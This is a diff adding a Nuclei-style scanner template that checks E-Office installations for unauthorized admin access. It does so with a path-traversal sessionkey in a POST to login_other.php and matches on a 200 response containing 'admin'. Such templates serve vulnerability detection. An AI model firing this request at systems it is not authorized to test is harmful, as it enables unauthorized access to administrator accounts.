@@ -1,0 +1,31 @@
+id: E-Office_other-unauthorized
+info:
+  name: E-Office_other-unauthorized
+  author: apple
+  severity: medium
+  description: 
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /E-mobile/App/System/Login/login_other.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.31.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Connection: close
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Length: 68
+        Content-Type: application/x-www-form-urlencoded
+
+        diff=getuser&id=admin&sessionkey=\\..\\..\\webroot\\index.php
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200'
+          - 'contains(body, "admin")'
+        condition: and
